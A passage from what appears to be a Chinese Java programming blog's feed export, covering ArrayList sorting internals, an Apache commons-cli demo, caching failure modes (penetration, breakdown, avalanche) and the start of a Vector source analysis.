class="line">            <span class="keyword">this</span>.offset = offset + fromIndex;</span><br><span class="line">            <span class="keyword">this</span>.size = toIndex - fromIndex;</span><br><span class="line">            <span class="keyword">this</span>.modCount = ArrayList.<span class="keyword">this</span>.modCount;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<h2 id="sort"><a href="#sort" class="headerlink" title="sort"></a>sort</h2></blockquote>
<p>只需要知道sort内部是归并排序和Tim Sort即可.此处不展开详细的排序算法.</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sort</span><span class="params">(Comparator&lt;? <span class="keyword">super</span> E&gt; c)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="keyword">int</span> expectedModCount = modCount;</span><br><span class="line">        Arrays.sort((E[]) elementData, <span class="number">0</span>, size, c);</span><br><span class="line">        <span class="keyword">if</span> (modCount != expectedModCount) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> ConcurrentModificationException();</span><br><span class="line">        &#125;</span><br><span class="line">        modCount++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="function"><span class="keyword">void</span> <span class="title">sort</span><span class="params">(T[] a, <span class="keyword">int</span> fromIndex, <span class="keyword">int</span> toIndex,</span></span></span><br><span class="line"><span class="function"><span class="params">                                Comparator&lt;? <span class="keyword">super</span> T&gt; c)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (c == <span class="keyword">null</span>) &#123;</span><br><span class="line">            sort(a, fromIndex, toIndex);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            rangeCheck(a.length, fromIndex, toIndex);</span><br><span class="line">            <span class="keyword">if</span> (LegacyMergeSort.userRequested)</span><br><span class="line">                legacyMergeSort(a, fromIndex, toIndex, c);</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                TimSort.sort(a, fromIndex, toIndex, c, <span class="keyword">null</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;   </span><br><span class="line">     </span><br><span class="line">     <span class="comment">// legacyMergeSort</span></span><br><span class="line">     <span class="keyword">private</span> <span class="keyword">static</span> &lt;T&gt; <span class="function"><span class="keyword">void</span> <span class="title">legacyMergeSort</span><span class="params">(T[] a, <span class="keyword">int</span> fromIndex, <span class="keyword">int</span> toIndex,</span></span></span><br><span class="line"><span class="function"><span class="params">                                            Comparator&lt;? <span class="keyword">super</span> T&gt; c)</span> </span>&#123;</span><br><span class="line">        T[] aux = copyOfRange(a, fromIndex, toIndex);</span><br><span class="line">        <span class="keyword">if</span> (c==<span class="keyword">null</span>)</span><br><span class="line">            mergeSort(aux, a, fromIndex, toIndex, -fromIndex);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            mergeSort(aux, a, fromIndex, toIndex, -fromIndex, c);</span><br><span class="line">    &#125;</span><br><span class="line">     <span class="comment">//mergeSort  归并排序</span></span><br><span class="line">     <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">mergeSort</span><span class="params">(Object[] src,</span></span></span><br><span class="line"><span class="function"><span class="params">                                  Object[] dest,</span></span></span><br><span class="line"><span class="function"><span class="params">                                  <span class="keyword">int</span> low,</span></span></span><br><span class="line"><span class="function"><span class="params">                                  <span class="keyword">int</span> high,</span></span></span><br><span class="line"><span class="function"><span class="params">                                  <span class="keyword">int</span> off)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> length = high - low;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Insertion sort on smallest arrays</span></span><br><span class="line">        <span class="keyword">if</span> (length &lt; INSERTIONSORT_THRESHOLD) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i=low; i&lt;high; i++)</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> j=i; j&gt;low &amp;&amp;</span><br><span class="line">                         ((Comparable) dest[j-<span class="number">1</span>]).compareTo(dest[j])&gt;<span class="number">0</span>; j--)</span><br><span class="line">                    swap(dest, j, j-<span class="number">1</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Recursively sort halves of dest into src</span></span><br><span class="line">        <span class="keyword">int</span> destLow  = low;</span><br><span class="line">        <span class="keyword">int</span> destHigh = high;</span><br><span class="line">        low  += off;</span><br><span class="line">        high += off;</span><br><span class="line">        <span class="keyword">int</span> mid = (low + high) &gt;&gt;&gt; <span class="number">1</span>;</span><br><span class="line">        mergeSort(dest, src, low, mid, -off);</span><br><span class="line">        mergeSort(dest, src, mid, high, -off);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// If list is already sorted, just copy from src to dest.  This is an</span></span><br><span class="line">        <span class="comment">// optimization that results in faster sorts for nearly ordered lists.</span></span><br><span class="line">        <span class="keyword">if</span> (((Comparable)src[mid-<span class="number">1</span>]).compareTo(src[mid]) &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">            System.arraycopy(src, low, dest, destLow, length);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Merge sorted halves (now in src) into dest</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = destLow, p = low, q = mid; i &lt; destHigh; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (q &gt;= high || p &lt; mid &amp;&amp; ((Comparable)src[p]).compareTo(src[q])&lt;=<span class="number">0</span>)</span><br><span class="line">                dest[i] = src[p++];</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                dest[i] = src[q++];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">///TimSort.sort</span></span><br><span class="line">    <span class="keyword">static</span> &lt;T&gt; <span class="function"><span class="keyword">void</span> <span class="title">sort</span><span class="params">(T[] a, <span class="keyword">int</span> lo, <span class="keyword">int</span> hi, Comparator&lt;? <span class="keyword">super</span> T&gt; c,</span></span></span><br><span class="line"><span class="function"><span class="params">                         T[] work, <span class="keyword">int</span> workBase, <span class="keyword">int</span> workLen)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">assert</span> c != <span class="keyword">null</span> &amp;&amp; a != <span class="keyword">null</span> &amp;&amp; lo &gt;= <span class="number">0</span> &amp;&amp; lo &lt;= hi &amp;&amp; hi &lt;= a.length;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> nRemaining  = hi - lo;</span><br><span class="line">        <span class="keyword">if</span> (nRemaining &lt; <span class="number">2</span>)</span><br><span class="line">            <span class="keyword">return</span>;  <span class="comment">// Arrays of size 0 and 1 are always sorted</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// If array is small, do a "mini-TimSort" with no merges</span></span><br><span class="line">        <span class="keyword">if</span> (nRemaining &lt; MIN_MERGE) &#123;</span><br><span class="line">            <span class="keyword">int</span> initRunLen = countRunAndMakeAscending(a, lo, hi, c);</span><br><span class="line">            binarySort(a, lo, hi, lo + initRunLen, c);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * March over the array once, left to right, finding natural runs,</span></span><br><span class="line"><span class="comment">         * extending short natural runs to minRun elements, and merging runs</span></span><br><span class="line"><span class="comment">         * to maintain stack invariant.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        TimSort&lt;T&gt; ts = <span class="keyword">new</span> TimSort&lt;&gt;(a, c, work, workBase, workLen);</span><br><span class="line">        <span class="keyword">int</span> minRun = minRunLength(nRemaining);</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="comment">// Identify next run</span></span><br><span class="line">            <span class="keyword">int</span> runLen = countRunAndMakeAscending(a, lo, hi, c);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// If run is short, extend to min(minRun, nRemaining)</span></span><br><span class="line">            <span class="keyword">if</span> (runLen &lt; minRun) &#123;</span><br><span class="line">                <span class="keyword">int</span> force = nRemaining &lt;= minRun ? nRemaining : minRun;</span><br><span class="line">                binarySort(a, lo, lo + force, lo + runLen, c);</span><br><span class="line">                runLen = force;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Push run onto pending-run stack, and maybe merge</span></span><br><span class="line">            ts.pushRun(lo, runLen);</span><br><span class="line">            ts.mergeCollapse();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Advance to find next run</span></span><br><span class="line">            lo += runLen;</span><br><span class="line">            nRemaining -= runLen;</span><br><span class="line">        &#125; <span class="keyword">while</span> (nRemaining != <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Merge all remaining runs to complete sort</span></span><br><span class="line">        <span class="keyword">assert</span> lo == hi;</span><br><span class="line">        ts.mergeForceCollapse();</span><br><span class="line">        <span class="keyword">assert</span> ts.stackSize == <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ul>
<li>初始容量为10</li>
<li>动态扩容容量为  old + old/2 </li>
<li>随机查找效率较高</li>
<li>插入和删除慢,需要移动元素</li>
<li>排序用归并排序和TimSort</li>
<li>动态删除元素会抛出异常,可用迭代器实现</li>
<li>线程不安全</li>
</ul>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><p><a href="https://docs.oracle.com/javase/specs/index.html" target="_blank" rel="noopener">JVM规范-官网</a></p>
</li>
<li><p><a href="https://bugs.java.com/" target="_blank" rel="noopener">JAVA Bugs -官网</a></p>
</li>
<li><p><a href="https://en.wikipedia.org/wiki/Timsort" target="_blank" rel="noopener">TimSort</a></p>
</li>
<li><p><a href="https://en.wikipedia.org/wiki/Merge_sort" target="_blank" rel="noopener">merge Sort</a></p>
</li>
</ul>
<h4 id="如有错误-欢迎批评指正-望不吝赐教"><a href="#如有错误-欢迎批评指正-望不吝赐教" class="headerlink" title="如有错误,欢迎批评指正,望不吝赐教!!!"></a>如有错误,欢迎批评指正,望不吝赐教!!!</h4></blockquote>
]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>commons-cli交互命令行工具</title>
    <url>/2019/03/19/java/commons-cli%E4%BA%A4%E4%BA%92%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%B7%A5%E5%85%B7/</url>
    <content><![CDATA[<p>Apache Commons CLI 库提供了一个 API，用于解析传递给程序的命令行选项。它还能够打印详细说明命令行工具可用选项的帮助消息。Commons CLI 支持不同类型的选项：</p>
<blockquote>
<ul>
<li>类 POSIX 选项(ie. tar -zxvf foo.tar.gz)</li>
<li>类 GNU 选项(ie. du —human-readable —max-depth=1)</li>
<li>类 Java 选项(ie. java -Djava.awt.headless=true -Djava.net.useSystemProxies=true Foo)</li>
<li>带有附加值的短参数项 (ie. gcc -O2 foo.c)</li>
<li>单个连字符的长选项 (ie. ant -projecthelp)</li>
</ul>
</blockquote>
<p>经常看到的就是如下的样式:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@bogon mysql]<span class="comment"># docker</span></span><br><span class="line"></span><br><span class="line">Usage:  docker COMMAND</span><br><span class="line"></span><br><span class="line">A self-sufficient runtime <span class="keyword">for</span> containers</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">      --config string      Location of client config files (default <span class="string">"/root/.docker"</span>)</span><br><span class="line">  -D, --debug              Enable debug mode</span><br><span class="line">      --<span class="built_in">help</span>               Print usage</span><br><span class="line">  -H, --host list          Daemon socket(s) to connect to (default [])</span><br><span class="line">  -l, --<span class="built_in">log</span>-level string   Set the logging level (<span class="string">"debug"</span>, <span class="string">"info"</span>, <span class="string">"warn"</span>, <span class="string">"error"</span>, <span class="string">"fatal"</span>) (default <span class="string">"info"</span>)</span><br><span class="line">      --tls                Use TLS; implied by --tlsverify</span><br><span class="line">      --tlscacert string   Trust certs signed only by this CA (default <span class="string">"/root/.docker/ca.pem"</span>)</span><br><span class="line">      --tlscert string     Path to TLS certificate file (default <span class="string">"/root/.docker/cert.pem"</span>)</span><br><span class="line">      --tlskey string      Path to TLS key file (default <span class="string">"/root/.docker/key.pem"</span>)</span><br><span class="line">      --tlsverify          Use TLS and verify the remote</span><br><span class="line">  -v, --version            Print version information and quit</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<h1 id="基础示例"><a href="#基础示例" class="headerlink" title="基础示例"></a>基础示例</h1><p>最近看了一下 RockerMQ 的源码,启动服务之前做了一系列命令行交互的操作。今天就来写个小 demo 了解一下基本的用法。废话不多说,直接上代码.</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--commons-cli--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">	    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-cli<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">	    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-cli<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">	    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.4<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>一段模拟启动、停止服务的交互命令：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.xwolf.util;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Objects;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.cli.CommandLine;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.cli.CommandLineParser;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.cli.DefaultParser;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.cli.HelpFormatter;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.cli.MissingArgumentException;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.cli.Option;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.cli.Options;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 命令行工具.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> xwolf</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommandLineUtil</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * 构建options.</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@return</span> 构造后的Options</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Options <span class="title">buildOptions</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    Options options = <span class="keyword">new</span> Options();</span><br><span class="line">    options.addOption(<span class="string">"h"</span>, <span class="string">"help"</span>, <span class="keyword">false</span>, <span class="string">"Print help for this application"</span>);</span><br><span class="line">    options.addOption(<span class="string">"v"</span>, <span class="string">"version"</span>, <span class="keyword">false</span>, <span class="string">"the version of the application"</span>);</span><br><span class="line">    options.addOption(<span class="string">"stop"</span>, <span class="keyword">false</span>, <span class="string">"stop the server"</span>);</span><br><span class="line">    options.addOption(<span class="string">"restart"</span>, <span class="keyword">false</span>, <span class="string">"restart the server"</span>);</span><br><span class="line"></span><br><span class="line">    Option optionStart = Option.builder(<span class="string">"start"</span>).hasArg().</span><br><span class="line">         argName(<span class="string">"port"</span>).desc(<span class="string">"start the server use this port"</span>)</span><br><span class="line">        .build();</span><br><span class="line"></span><br><span class="line">    options.addOption(optionStart);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> options;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * 显示帮助信息.</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> options</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">printHelp</span><span class="params">(Options options)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    HelpFormatter hf = <span class="keyword">new</span> HelpFormatter();</span><br><span class="line">    hf.setWidth(<span class="number">100</span>);</span><br><span class="line">    hf.printHelp(<span class="string">"CommandLine"</span>,options);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * 解析命令行参数</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">parseLine</span><span class="params">(Options options, String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    CommandLineParser parser = <span class="keyword">new</span> DefaultParser();</span><br><span class="line">    CommandLine line = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">      line = parser.parse(options, args);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (MissingArgumentException e) &#123;</span><br><span class="line"></span><br><span class="line">      printHelp(options);</span><br><span class="line">      System.exit(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">      e.printStackTrace();</span><br><span class="line">      System.exit(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 打印help信息</span></span><br><span class="line">    <span class="keyword">if</span> (Objects.isNull(args) || Objects.isNull(line)</span><br><span class="line">        || args.length == <span class="number">0</span> || line.hasOption(<span class="string">"h"</span>) || line.hasOption(<span class="string">"help"</span>)) &#123;</span><br><span class="line"></span><br><span class="line">       printHelp(options);</span><br><span class="line">       System.exit(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// start</span></span><br><span class="line">    <span class="keyword">if</span> (line.hasOption(<span class="string">"start"</span>)) &#123;</span><br><span class="line">      <span class="keyword">int</span> port = <span class="number">8080</span>;</span><br><span class="line"></span><br><span class="line">      String portStr = line.getOptionValue(<span class="string">"start"</span>);</span><br><span class="line">      <span class="keyword">if</span> (Objects.nonNull(portStr)) &#123;</span><br><span class="line"></span><br><span class="line">         <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">          port = Integer.parseInt(portStr);</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (port &lt; <span class="number">80</span> || port &gt; <span class="number">65535</span>) &#123;</span><br><span class="line">            System.err.println(<span class="string">"端口应为80-65535"</span>);</span><br><span class="line">            System.exit(-<span class="number">1</span>);</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (NumberFormatException e) &#123;</span><br><span class="line"></span><br><span class="line">          System.err.println(<span class="string">"端口应为80-65535"</span>);</span><br><span class="line">          System.exit(-<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      System.out.printf(<span class="string">"服务已在%d端口启动!"</span>,port);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// stop</span></span><br><span class="line">    <span class="keyword">if</span> (line.hasOption(<span class="string">"stop"</span>)) &#123;</span><br><span class="line"></span><br><span class="line">      System.out.println(<span class="string">"stop the server"</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// restart</span></span><br><span class="line">    <span class="keyword">if</span> (line.hasOption(<span class="string">"restart"</span>)) &#123;</span><br><span class="line">      System.out.println(<span class="string">"restart the server"</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">// version</span></span><br><span class="line">    <span class="keyword">if</span> (line.hasOption(<span class="string">"v"</span>) || line.hasOption(<span class="string">"version"</span>)) &#123;</span><br><span class="line">      System.out.println(<span class="string">"the server version is 0.0.1"</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * 主函数.</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> args 参数</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    parseLine(buildOptions(), args);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>通过在 IDE 中配置参数来输出不同的信息。</p>
<p><img src="/2019/03/19/java/commons-cli交互命令行工具/cli_20190319153447.png" alt="帮助信息"></p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><blockquote>
<ul>
<li><a href="https://commons.apache.org/proper/commons-cli/usage.html" target="_blank" rel="noopener">commons-cli usage</a></li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>缓存穿透&amp;缓存击穿&amp;缓存雪崩</title>
    <url>/2019/04/23/distributed/%E7%BC%93%E5%AD%98%E7%A9%BF%E9%80%8F&amp;%E7%BC%93%E5%AD%98%E5%87%BB%E7%A9%BF&amp;%E7%BC%93%E5%AD%98%E9%9B%AA%E5%B4%A9/</url>
    <content><![CDATA[<p>在分布式系统中,缓存层总是会存在下边的几个问题</p>
<blockquote>
<ul>
<li>缓存穿透</li>
<li>缓存击穿</li>
<li>缓存雪崩</li>
</ul>
</blockquote>
<p>本文来讨论解决这几个问题.</p>
<a id="more"></a>
<h1 id="缓存穿透"><a href="#缓存穿透" class="headerlink" title="缓存穿透"></a>缓存穿透</h1><p>首先在系统中,一般的查询操作流程如下图所示:</p>
<p><img src="/2019/04/23/distributed/缓存穿透&缓存击穿&缓存雪崩/查询cache.png" alt></p>
<p>缓存穿透是指查询一个不存在的数据,由于缓存中没有该数据无法命中,每次请求都要到存储层去查询,失去了缓存的意义.在大量请求的情况下,可能直接压垮数据存储层.</p>
<h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><blockquote>
<ul>
<li>布隆过滤器</li>
</ul>
</blockquote>
<p>布隆过滤器是一种空间效率极高的概率型算法和数据结构,用于判断一个元素是否在集合中.需要将可能查询到的 key 提前放入布隆过滤器中.</p>
<blockquote>
<ul>
<li>缓存查询结果</li>
</ul>
</blockquote>
<p>如果查询的结果为空也存入缓存中,并设置过期时间,比如一分钟.</p>
<h1 id="缓存击穿"><a href="#缓存击穿" class="headerlink" title="缓存击穿"></a>缓存击穿</h1><p>缓存击穿是指一个 key 访问很频繁,当这个 key 在失效的瞬间,持续的大并发就穿破缓存,直接请求数据库.</p>
<h2 id="解决方法-1"><a href="#解决方法-1" class="headerlink" title="解决方法"></a>解决方法</h2><blockquote>
<ul>
<li>永不过期</li>
</ul>
</blockquote>
<p>简单粗暴,竟然有这么高的请求访问量,必须永不过期.</p>
<blockquote>
<ul>
<li>锁</li>
</ul>
</blockquote>
<p>引入互斥锁,加锁后从 db 查询数据并载入缓存,最后释放锁.保障同一时刻只有一个请求去查询 db,减小 db 压力.</p>
<h1 id="缓存雪崩"><a href="#缓存雪崩" class="headerlink" title="缓存雪崩"></a>缓存雪崩</h1><p>缓存雪崩,是指在某一个时刻缓存集中过期失效,造成瞬时 DB 请求量大、压力骤增,引起雪崩.</p>
<h2 id="解决方法-2"><a href="#解决方法-2" class="headerlink" title="解决方法"></a>解决方法</h2><p>可以给缓存设置过期时间时加上一个随机值时间,使得每个 key 的过期时间分布开来,避免缓存集中在同一时刻失效.</p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote>
<ul>
<li><a href="https://en.wikipedia.org/wiki/Bloom_filter" target="_blank" rel="noopener">Bloom filter</a></li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>分布式</category>
      </categories>
      <tags>
        <tag>分布式</tag>
      </tags>
  </entry>
  <entry>
    <title>java集合源码分析之Vector</title>
    <url>/2018/06/03/java/java%E9%9B%86%E5%90%88%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E4%B9%8BVector/</url>
    <content><![CDATA[<p>源码分析以JDK1.8为例.<br>Vector是线程安全的动态数组的实现.<br>UML图<br><img src="https://i.imgur.com/YI69aiZ.png" alt></p>
<blockquote>
<h1 id="源码解读"><a href="#源码解读" class="headerlink" title="源码解读"></a>源码解读</h1><h2 id="公共属性"><a href="#公共属性" class="headerlink" title="公共属性"></a>公共属性</h2></blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//元素数组</span></span><br><span class="line"><span class="keyword">protected</span> Object[] elementData;</span><br><span class="line"></span><br><span class="line"><span class="comment">//元素数量</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">int</span> elementCount;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * The amount by which the capacity of the vector is automatically</span></span><br><span class="line"><span class="comment">     * incremented when its size becomes greater than its capacity.  If</span></span><br><span class="line"><span class="comment">     * the capacity increment is less than or equal to zero, the capacity</span></span><br><span class="line"><span class="comment">     * of the vector is doubled each time it needs to grow.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@serial</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"><span class="comment">//扩容基数     </span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">int</span> capacityIncrement;</span><br><span class="line"></span><br><span class="line"><span class="comment">//默认最大元素个数</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> MAX_ARRAY_SIZE = Integer.MAX_VALUE - <span class="number">8</span>;</span><br></pre></td></tr></table></figure>
<blockquote>
<h2 id="构造器"><a href="#构造器" class="headerlink" title="构造器"></a>构造器</h2></blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//默认初始容量10</span></span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="title">Vector</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>(<span class="number">10</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//指定容量初始化</span></span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="title">Vector</span><span class="params">(<span class="keyword">int</span> initialCapacity)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>(initialCapacity, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//指定初始容量和容量增加数来初始化vector</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">Vector</span><span class="params">(<span class="keyword">int</span> initialCapacity, <span class="keyword">int</span> capacityIncrement)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">        <span class="keyword">if</span> (initialCapacity &lt; <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Illegal Capacity: "</span>+</span><br><span class="line">                                               initialCapacity);</span><br><span class="line">        <span class="comment">//元素数组初始化                                       </span></span><br><span class="line">        <span class="keyword">this</span>.elementData = <span class="keyword">new</span> Object[initialCapacity];</span><br><span class="line">        <span class="keyword">this</span>.capacityIncrement = capacityIncrement;</span><br><span class="line">    &#125;  </span><br><span class="line"></span><br><span class="line"><span class="comment">//用集合初始化数组</span></span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="title">Vector</span><span class="params">(Collection&lt;? extends E&gt; c)</span> </span>&#123;</span><br><span class="line">        elementData = c.toArray();</span><br><span class="line">        elementCount = elementData.length;</span><br><span class="line">        <span class="comment">// c.toArray might (incorrectly) not return Object[] (see 6260652)</span></span><br><span class="line">        <span class="keyword">if</span> (elementData.getClass() != Object[].class)</span><br><span class="line">            elementData = Arrays.copyOf(elementData, elementCount, Object[].class);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<h2 id="add"><a href="#add" class="headerlink" title="add"></a>add</h2></blockquote>
